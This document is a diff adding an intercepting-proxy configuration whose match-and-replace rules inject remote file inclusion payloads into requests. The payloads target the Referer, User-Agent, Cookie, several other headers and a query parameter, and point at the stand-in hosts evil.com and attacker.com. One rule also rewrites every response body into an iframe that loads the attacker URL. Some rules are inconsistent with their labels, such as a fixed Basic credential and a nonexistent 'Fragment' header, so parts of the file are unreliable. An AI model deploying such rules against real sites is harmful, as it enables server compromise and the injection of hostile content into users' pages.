@@ -1,0 +1,94 @@
+{
+    "proxy": {
+        "match_replace_rules": [
+            {
+                "comment": "Inject RFI payload in Referer",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Referer:.*$",
+                "string_replace": "Referer: http://evil.com/rfi?file=http://attacker.com/maliciousfile"
+            },
+            {
+                "comment": "Inject RFI payload in User-Agent",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^User-Agent:.*$",
+                "string_replace": "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36; http://evil.com/rfi?file=http://attacker.com/maliciousfile"
+            },
+            {
+                "comment": "Inject RFI payload in Cookie",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Cookie:.*$",
+                "string_replace": "Cookie: PHPSESSID=123456; user=admin; rfi=http://evil.com/rfi?file=http://attacker.com/maliciousfile"
+            },
+            {
+                "comment": "Inject RFI payload in query parameter",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_parameter",
+                "string_match": "id=.*$",
+                "string_replace": "id=http://evil.com/rfi?file=http://attacker.com/maliciousfile"
+            },
+            {
+                "comment": "Inject RFI payload in URI fragment",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Fragment:.*$",
+                "string_replace": "Fragment: http://evil.com/rfi?file=http://attacker.com/maliciousfile"
+            },
+            {
+                "comment": "Inject RFI payload in X-Forwarded-For",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^X-Forwarded-For:.*$",
+                "string_replace": "X-Forwarded-For: 127.0.0.1, evil.com"
+            },
+            {
+                "comment": "Inject RFI payload in Accept-Language header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Accept-Language:.*$",
+                "string_replace": "Accept-Language: en-US, http://evil.com/rfi?file=http://attacker.com/maliciousfile"
+            },
+            {
+                "comment": "Inject RFI payload in Referer for login page",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Referer:.*login.*$",
+                "string_replace": "Referer: http://evil.com/rfi?file=http://attacker.com/maliciousfile"
+            },
+            {
+                "comment": "Inject RFI payload in Authorization header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Authorization:.*$",
+                "string_replace": "Authorization: Basic dXNlcjpwYXNz"
+            },
+            {
+                "comment": "Inject RFI payload in custom header X-Custom-Header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^X-Custom-Header:.*$",
+                "string_replace": "X-Custom-Header: http://evil.com/rfi?file=http://attacker.com/maliciousfile"
+            },
+            {
+                "comment": "Inject RFI payload in response body",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "response_body",
+                "string_match": "<body>.*</body>",
+                "string_replace": "<body><iframe src=\"http://evil.com/rfi?file=http://attacker.com/maliciousfile\"></iframe></body>"
+            }
+        ]
+    }
+}
